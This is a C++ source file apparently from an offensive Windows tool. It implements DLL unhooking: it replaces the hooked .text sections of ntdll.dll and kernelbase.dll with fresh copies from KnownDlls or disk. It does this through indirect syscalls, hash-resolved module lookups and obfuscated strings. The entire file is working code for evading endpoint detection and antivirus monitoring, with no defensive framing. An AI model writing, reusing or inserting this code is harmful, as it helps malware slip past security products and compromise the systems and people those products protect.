#include "unhook.h"
#include "syscalls.h"
#include "peb_walk.h"
#include "hash.h"
#include "obfstr.h"
#include <cstdio>
#include <cstring>
#include <windows.h>
#include <winternl.h>

// Find the .text section of a PE in memory
static bool find_text_section(uint8_t* base, uint8_t** text_start, size_t* text_size) {
    IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    IMAGE_NT_HEADERS* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0 ||
            (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            *text_start = base + sections[i].VirtualAddress;
            *text_size = sections[i].Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

// Unhook a DLL by replacing its .text with a fresh copy from KnownDlls
static bool unhook_dll_from_knowndlls(const wchar_t* knowndll_name, uint32_t dll_hash, const char* display_name) {
    printf("[*] Unhooking %s via KnownDlls...\n", display_name);

    // Get the in-memory base of the loaded (potentially hooked) DLL
    uint8_t* loaded_base = reinterpret_cast<uint8_t*>(get_module_base(dll_hash));
    if (!loaded_base) {
        printf("[!] %s not found in PEB\n", display_name);
        return false;
    }

    uint8_t* loaded_text = nullptr;
    size_t loaded_text_size = 0;
    if (!find_text_section(loaded_base, &loaded_text, &loaded_text_size)) {
        printf("[!] Could not find .text section in loaded %s\n", display_name);
        return false;
    }

    // Build the object path: \KnownDlls\<name>
    // Construct UNICODE_STRING and OBJECT_ATTRIBUTES manually
    wchar_t path_buf[128] = {};
    wcscpy_s(path_buf, L"\\KnownDlls\\");
    wcscat_s(path_buf, knowndll_name);

    UNICODE_STRING us_path;
    us_path.Buffer = path_buf;
    us_path.Length = static_cast<USHORT>(wcslen(path_buf) * sizeof(wchar_t));
    us_path.MaximumLength = us_path.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    // Open the section via indirect syscall
    HANDLE hSection = nullptr;
    NTSTATUS status = sc_NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa);
    if (status != 0) {
        printf("[!] NtOpenSection failed for %s (0x%08X)\n", display_name, static_cast<unsigned int>(status));
        return false;
    }

    // Map a fresh copy via indirect syscall
    PVOID fresh_base = nullptr;
    SIZE_T view_size = 0;
    status = sc_NtMapViewOfSection(hSection,
        reinterpret_cast<HANDLE>(-1), // NtCurrentProcess
        &fresh_base, 0, 0, nullptr, &view_size,
        1, // ViewShare
        0, PAGE_READONLY);

    if (status < 0) {
        printf("[!] NtMapViewOfSection failed for %s (0x%08X)\n", display_name, static_cast<unsigned int>(status));
        sc_NtClose(hSection);
        return false;
    }
    if (status != 0) {
        printf("[*] NtMapViewOfSection info status for %s: 0x%08X (continuing)\n", display_name, static_cast<unsigned int>(status));
    }
    printf("[*] %s fresh copy mapped at %p (view_size=%zu)\n", display_name, fresh_base, view_size);

    // Find .text in the fresh copy
    uint8_t* fresh_text = nullptr;
    size_t fresh_text_size = 0;
    if (!find_text_section(reinterpret_cast<uint8_t*>(fresh_base), &fresh_text, &fresh_text_size)) {
        printf("[!] Could not find .text in fresh copy of %s\n", display_name);
        sc_NtUnmapViewOfSection(reinterpret_cast<HANDLE>(-1), fresh_base);
        sc_NtClose(hSection);
        return false;
    }
    printf("[*] %s fresh .text at %p (%zu bytes), loaded .text at %p (%zu bytes)\n",
        display_name, fresh_text, fresh_text_size, loaded_text, loaded_text_size);

    // Use the smaller of the two sizes to avoid overwrite issues
    size_t copy_size = (loaded_text_size < fresh_text_size) ? loaded_text_size : fresh_text_size;

    // Change protection to RW via indirect syscall
    PVOID protect_addr = loaded_text;
    SIZE_T protect_size = copy_size;
    ULONG old_protect = 0;
    status = sc_NtProtectVirtualMemory(
        reinterpret_cast<HANDLE>(-1),
        &protect_addr, &protect_size,
        PAGE_READWRITE, &old_protect);

    if (status != 0) {
        printf("[!] NtProtectVirtualMemory (RW) failed for %s (0x%08X)\n", display_name, static_cast<unsigned int>(status));
        sc_NtUnmapViewOfSection(reinterpret_cast<HANDLE>(-1), fresh_base);
        sc_NtClose(hSection);
        return false;
    }
    printf("[*] %s .text protection changed to RW, copying %zu bytes...\n", display_name, copy_size);

    // Copy fresh .text over the hooked one
    memcpy(loaded_text, fresh_text, copy_size);
    printf("[*] %s .text memcpy done\n", display_name);

    // Restore protection to RX
    protect_addr = loaded_text;
    protect_size = copy_size;
    ULONG tmp_protect = 0;
    sc_NtProtectVirtualMemory(
        reinterpret_cast<HANDLE>(-1),
        &protect_addr, &protect_size,
        old_protect, &tmp_protect);

    // Cleanup
    sc_NtUnmapViewOfSection(reinterpret_cast<HANDLE>(-1), fresh_base);
    sc_NtClose(hSection);

    printf("[+] %s unhooked (%zu bytes replaced)\n", display_name, copy_size);
    return true;
}

// Fallback: unhook from disk file (for DLLs not in KnownDlls)
static bool unhook_dll_from_disk(const wchar_t* file_path, uint32_t dll_hash, const char* display_name) {
    printf("[*] Unhooking %s from disk (fallback)...\n", display_name);

    uint8_t* loaded_base = reinterpret_cast<uint8_t*>(get_module_base(dll_hash));
    if (!loaded_base) {
        printf("[!] %s not found in PEB\n", display_name);
        return false;
    }

    uint8_t* loaded_text = nullptr;
    size_t loaded_text_size = 0;
    if (!find_text_section(loaded_base, &loaded_text, &loaded_text_size)) {
        printf("[!] Could not find .text in loaded %s\n", display_name);
        return false;
    }

    // Build UNICODE_STRING for NT path
    UNICODE_STRING us_path;
    us_path.Buffer = const_cast<PWSTR>(file_path);
    us_path.Length = static_cast<USHORT>(wcslen(file_path) * sizeof(wchar_t));
    us_path.MaximumLength = us_path.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_path, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    IO_STATUS_BLOCK iosb = {};
    HANDLE hFile = nullptr;
    NTSTATUS status = sc_NtOpenFile(&hFile,
        FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

    if (status != 0) {
        printf("[!] NtOpenFile failed for %s (0x%08X)\n", display_name, static_cast<unsigned int>(status));
        return false;
    }

    // Create a section from the file
    HANDLE hSection = nullptr;
    status = sc_NtCreateSection(&hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile);

    if (status != 0) {
        printf("[!] NtCreateSection failed for %s (0x%08X)\n", display_name, static_cast<unsigned int>(status));
        sc_NtClose(hFile);
        return false;
    }

    PVOID fresh_base = nullptr;
    SIZE_T view_size = 0;
    status = sc_NtMapViewOfSection(hSection,
        reinterpret_cast<HANDLE>(-1),
        &fresh_base, 0, 0, nullptr, &view_size,
        1, 0, PAGE_READONLY);

    if (status < 0) {
        printf("[!] NtMapViewOfSection (disk) failed for %s (0x%08X)\n", display_name, static_cast<unsigned int>(status));
        sc_NtClose(hSection);
        sc_NtClose(hFile);
        return false;
    }
    if (status != 0) {
        printf("[*] NtMapViewOfSection (disk) info status for %s: 0x%08X\n", display_name, static_cast<unsigned int>(status));
    }

    uint8_t* fresh_text = nullptr;
    size_t fresh_text_size = 0;
    if (!find_text_section(reinterpret_cast<uint8_t*>(fresh_base), &fresh_text, &fresh_text_size)) {
        printf("[!] Could not find .text in disk copy of %s\n", display_name);
        sc_NtUnmapViewOfSection(reinterpret_cast<HANDLE>(-1), fresh_base);
        sc_NtClose(hSection);
        sc_NtClose(hFile);
        return false;
    }

    size_t copy_size = (loaded_text_size < fresh_text_size) ? loaded_text_size : fresh_text_size;

    PVOID protect_addr = loaded_text;
    SIZE_T protect_size = copy_size;
    ULONG old_protect = 0;
    status = sc_NtProtectVirtualMemory(
        reinterpret_cast<HANDLE>(-1),
        &protect_addr, &protect_size,
        PAGE_READWRITE, &old_protect);

    if (status != 0) {
        printf("[!] NtProtectVirtualMemory (RW) failed for %s disk (0x%08X)\n", display_name, static_cast<unsigned int>(status));
        sc_NtUnmapViewOfSection(reinterpret_cast<HANDLE>(-1), fresh_base);
        sc_NtClose(hSection);
        sc_NtClose(hFile);
        return false;
    }

    memcpy(loaded_text, fresh_text, copy_size);

    protect_addr = loaded_text;
    protect_size = copy_size;
    ULONG tmp = 0;
    sc_NtProtectVirtualMemory(
        reinterpret_cast<HANDLE>(-1),
        &protect_addr, &protect_size,
        old_protect, &tmp);

    sc_NtUnmapViewOfSection(reinterpret_cast<HANDLE>(-1), fresh_base);
    sc_NtClose(hSection);
    sc_NtClose(hFile);

    printf("[+] %s unhooked from disk (%zu bytes replaced)\n", display_name, copy_size);
    return true;
}

bool unhook_ntdll() {
    auto name = OBFWSTR(L"ntdll.dll");
    return unhook_dll_from_knowndlls(name.c_str(), HASH_NTDLL, "ntdll.dll");
}

bool unhook_kernelbase() {
    // Try KnownDlls first
    auto name = OBFWSTR(L"kernelbase.dll");
    if (unhook_dll_from_knowndlls(name.c_str(), HASH_KERNELBASE, "kernelbase.dll")) {
        return true;
    }

    // Fallback: read from disk
    printf("[*] kernelbase.dll not in KnownDlls, falling back to disk...\n");
    auto disk_path = OBFWSTR(L"\\??\\C:\\Windows\\System32\\kernelbase.dll");
    return unhook_dll_from_disk(disk_path.c_str(), HASH_KERNELBASE, "kernelbase.dll");
}

bool unhook_all() {
    printf("[*] Starting DLL unhooking...\n");

    bool ntdll_ok = unhook_ntdll();
    if (!ntdll_ok) {
        printf("[!] ntdll unhooking failed -- continuing anyway\n");
    }

    bool kb_ok = unhook_kernelbase();
    if (!kb_ok) {
        printf("[!] kernelbase unhooking failed -- continuing anyway\n");
    }

    return ntdll_ok; // ntdll is critical, kernelbase is best-effort
}
